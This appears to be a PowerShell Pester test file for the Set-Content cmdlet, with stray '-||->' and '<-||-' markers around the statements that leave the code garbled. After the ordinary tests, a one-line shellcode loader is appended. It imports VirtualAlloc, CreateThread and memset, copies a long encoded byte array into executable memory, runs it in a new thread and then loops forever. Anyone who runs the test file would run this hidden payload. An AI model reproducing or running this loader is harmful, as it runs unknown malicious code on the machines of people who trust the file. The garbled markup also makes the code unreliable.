

 -||-> Describe "Set-Content cmdlet tests" -Tags "CI" {
     -||-> BeforeAll {
         -||-> $file1 = "file1.txt" <-||- 
         -||-> $filePath1 =  -||-> Join-Path $testdrive $file1 <-||-  <-||- 
        
         -||-> $skipRegistry = ! ( -||-> Test-Path hklm:/ <-||- ) <-||- 
    } <-||- 

     -||-> It "A warning should be emitted if both -AsByteStream and -Encoding are used together" {
         -||-> $testfile = "${TESTDRIVE}\bfile.txt" <-||- 
         -||-> "test" | Set-Content $testfile <-||- 
         -||-> $result =  -||-> Get-Content -AsByteStream -Encoding Unicode -Path $testfile -WarningVariable contentWarning *> $null <-||-  <-||- 
         -||-> $contentWarning.Message | Should -Match "-AsByteStream" <-||- 
    } <-||- 

     -||-> Context "Set-Content should create a file if it does not exist" {
         -||-> AfterEach {
           -||-> Remove-Item -Path $filePath1 -Force -ErrorAction SilentlyContinue <-||- 
        } <-||- 
         -||-> It "should create a file if it does not exist" {
             -||-> Set-Content -Path $filePath1 -Value "$file1" <-||- 
             -||-> $result =  -||-> Get-Content -Path $filePath1 <-||-  <-||- 
             -||-> $result| Should -Be "$file1" <-||- 
        } <-||- 
    } <-||- 
     -||-> Context "Set-Content/Get-Content should set/get the content of an exisiting file" {
         -||-> BeforeAll {
           -||-> New-Item -Path $filePath1 -ItemType File -Force <-||- 
        } <-||- 
         -||-> It "should set-Content of testdrive\$file1" {
             -||-> Set-Content -Path $filePath1 -Value "ExpectedContent" <-||- 
             -||-> $result =  -||-> Get-Content -Path $filePath1 <-||-  <-||- 
             -||-> $result| Should -Be "ExpectedContent" <-||- 
        } <-||- 
         -||-> It "should return expected string from testdrive\$file1" {
             -||-> $result =  -||-> Get-Content -Path $filePath1 <-||-  <-||- 
             -||-> $result | Should -BeExactly "ExpectedContent" <-||- 
        } <-||- 
         -||-> It "should Set-Content to testdrive\dynamicfile.txt with dynamic parameters" {
             -||-> Set-Content -Path $testdrive\dynamicfile.txt -Value "ExpectedContent" <-||- 
             -||-> $result =  -||-> Get-Content -Path $testdrive\dynamicfile.txt <-||-  <-||- 
             -||-> $result| Should -BeExactly "ExpectedContent" <-||- 
        } <-||- 
         -||-> It "should return expected string from testdrive\dynamicfile.txt" {
             -||-> $result =  -||-> Get-Content -Path $testdrive\dynamicfile.txt <-||-  <-||- 
             -||-> $result | Should -BeExactly "ExpectedContent" <-||- 
        } <-||- 
         -||-> It "should remove existing content from testdrive\$file1 when the -Value is `$null" {
             -||-> $AsItWas= -||-> Get-Content $filePath1 <-||-  <-||- 
             -||-> $AsItWas |Should -BeExactly "ExpectedContent" <-||- 
             -||-> Set-Content -Path $filePath1 -Value $null -ErrorAction Stop <-||- 
             -||-> $AsItIs= -||-> Get-Content $filePath1 <-||-  <-||- 
             -||-> $AsItIs| Should -Not -Be $AsItWas <-||- 
        } <-||- 
         -||-> It "should throw 'ParameterArgumentValidationErrorNullNotAllowed' when -Path is `$null" {
             -||-> {  -||-> Set-Content -Path $null -Value "ShouldNotWorkBecausePathIsNull" -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.SetContentCommand" <-||- 
        } <-||- 
         -||-> It "should throw 'ParameterArgumentValidationErrorNullNotAllowed' when -Path is `$()" {
             -||-> {  -||-> Set-Content -Path $() -Value "ShouldNotWorkBecausePathIsInvalid" -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.SetContentCommand" <-||- 
        } <-||- 
         -||-> It "should throw 'PSNotSupportedException' when you Set-Content to an unsupported provider" -skip:$skipRegistry {
             -||-> {  -||-> Set-Content -Path HKLM:\\software\\microsoft -Value "ShouldNotWorkBecausePathIsUnsupported" -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "NotSupported,Microsoft.PowerShell.Commands.SetContentCommand" <-||- 
        } <-||- 
        
         -||-> It "should be able to pass multiple [string]`$objects to Set-Content through the pipeline to output a dynamic Path file" {
             -||-> "hello","world"|Set-Content $testdrive\dynamicfile2.txt <-||- 
             -||-> $result= -||-> Get-Content $testdrive\dynamicfile2.txt <-||-  <-||- 
             -||-> $result.length | Should -Be 2 <-||- 
             -||-> $result[0]     | Should -BeExactly "hello" <-||- 
             -||-> $result[1]     | Should -BeExactly "world" <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "Set-Content should work for PSDrive with UNC path as root" -Tags @( -||-> 'CI', 'RequireAdminOnWindows' <-||- ) {
     -||-> BeforeAll {
         -||-> $file1 = "file1.txt" <-||- 
        
         -||-> $randomFolderName = "TestFolder_" + ( -||-> Get-Random <-||- ).ToString() <-||- 
         -||-> $randomFolderPath =  -||-> Join-Path $testdrive $randomFolderName <-||-  <-||- 
         -||-> $null =  -||-> New-Item -Path $randomFolderPath -ItemType Directory -ErrorAction SilentlyContinue <-||-  <-||- 
    } <-||- 
    
     -||-> It "should create a file in a psdrive with UNC path as root" -Pending {
         -||-> try
        {
            
             -||-> net share testshare=$randomFolderPath /grant:everyone,FULL <-||- 
             -||-> New-PSDrive -Name Foo -Root \\localhost\testshare -PSProvider FileSystem <-||- 
             -||-> Set-Content -Path Foo:\$file1 -Value "$file1" <-||- 
             -||-> $result =  -||-> Get-Content -Path Foo:\$file1 <-||-  <-||- 
             -||-> $result| Should -BeExactly "$file1" <-||- 
        }
        finally
        {
             -||-> Remove-PSDrive -Name Foo <-||- 
             -||-> net share testshare /delete <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xdb,0xc5,0xbd,0x00,0xdd,0x6a,0x82,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x68,0x14,0x03,0x68,0x14,0x3f,0x9f,0x7e,0xfc,0x3d,0x60,0x7f,0xfc,0x21,0xe8,0x9a,0xcd,0x61,0x8e,0xef,0x7d,0x52,0xc4,0xa2,0x71,0x19,0x88,0x56,0x02,0x6f,0x05,0x58,0xa3,0xda,0x73,0x57,0x34,0x76,0x47,0xf6,0xb6,0x85,0x94,0xd8,0x87,0x45,0xe9,0x19,0xc0,0xb8,0x00,0x4b,0x99,0xb7,0xb7,0x7c,0xae,0x82,0x0b,0xf6,0xfc,0x03,0x0c,0xeb,0xb4,0x22,0x3d,0xba,0xcf,0x7c,0x9d,0x3c,0x1c,0xf5,0x94,0x26,0x41,0x30,0x6e,0xdc,0xb1,0xce,0x71,0x34,0x88,0x2f,0xdd,0x79,0x25,0xc2,0x1f,0xbd,0x81,0x3d,0x6a,0xb7,0xf2,0xc0,0x6d,0x0c,0x89,0x1e,0xfb,0x97,0x29,0xd4,0x5b,0x7c,0xc8,0x39,0x3d,0xf7,0xc6,0xf6,0x49,0x5f,0xca,0x09,0x9d,0xeb,0xf6,0x82,0x20,0x3c,0x7f,0xd0,0x06,0x98,0x24,0x82,0x27,0xb9,0x80,0x65,0x57,0xd9,0x6b,0xd9,0xfd,0x91,0x81,0x0e,0x8c,0xfb,0xcd,0xe3,0xbd,0x03,0x0d,0x6c,0xb5,0x70,0x3f,0x33,0x6d,0x1f,0x73,0xbc,0xab,0xd8,0x74,0x97,0x0c,0x76,0x8b,0x18,0x6d,0x5e,0x4f,0x4c,0x3d,0xc8,0x66,0xed,0xd6,0x08,0x87,0x38,0x42,0x0c,0x1f,0x96,0xab,0xfe,0x04,0x70,0xce,0xfe,0xb3,0x4b,0x47,0x18,0x93,0x1b,0x08,0xb5,0x53,0xcc,0xe8,0x65,0x3b,0x06,0xe7,0x5a,0x5b,0x29,0x2d,0xf3,0xf1,0xc6,0x98,0xab,0x6d,0x7e,0x81,0x20,0x0c,0x7f,0x1f,0x4d,0x0e,0x0b,0xac,0xb1,0xc0,0xfc,0xd9,0xa1,0xb4,0x0c,0x94,0x98,0x12,0x12,0x02,0xb6,0x9a,0x86,0xa9,0x11,0xcd,0x3e,0xb0,0x44,0x39,0xe1,0x4b,0xa3,0x32,0x28,0xde,0x0c,0x2c,0x55,0x0e,0x8d,0xac,0x03,0x44,0x8d,0xc4,0xf3,0x3c,0xde,0xf1,0xfb,0xe8,0x72,0xaa,0x69,0x13,0x23,0x1f,0x39,0x7b,0xc9,0x46,0x0d,0x24,0x32,0xad,0x8f,0x18,0xe5,0x8b,0xe5,0x70,0x35 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



